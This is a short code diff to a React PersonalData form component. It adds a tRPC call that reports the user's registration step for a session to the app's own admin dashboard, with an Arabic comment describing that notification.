@@ -71,6 +71,17 @@ export default function PersonalData() {
   });
 
   const submitPersonalDataMutation = trpc.submissions.submitPersonalData.useMutation();
+  const reportStepMutation = trpc.submissions.reportStep.useMutation();
+
+  useEffect(() => {
+    const currentSessionId = sessionId || params.get("session") || localStorage.getItem("sessionId") || "";
+    if (currentSessionId) {
+      reportStepMutation.mutate({
+        sessionId: currentSessionId,
+        step: "personal-data"
+      });
+    }
+  }, []);
 
   const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
     const { name, value } = e.target;
@@ -128,6 +139,12 @@ export default function PersonalData() {
 
       await submitPersonalDataMutation.mutateAsync(submissionPayload);
       
+      // إبلاغ لوحة الإدارة بالانتقال للمرحلة التالية
+      await reportStepMutation.mutateAsync({
+        sessionId: currentSessionId,
+        step: "registration-completion"
+      });
+
       console.log("Data saved successfully, redirecting...");
       toast.success(isArabic ? "تم حفظ البيانات بنجاح" : "Data saved successfully");
       const giftId = params.get("gift") || "";
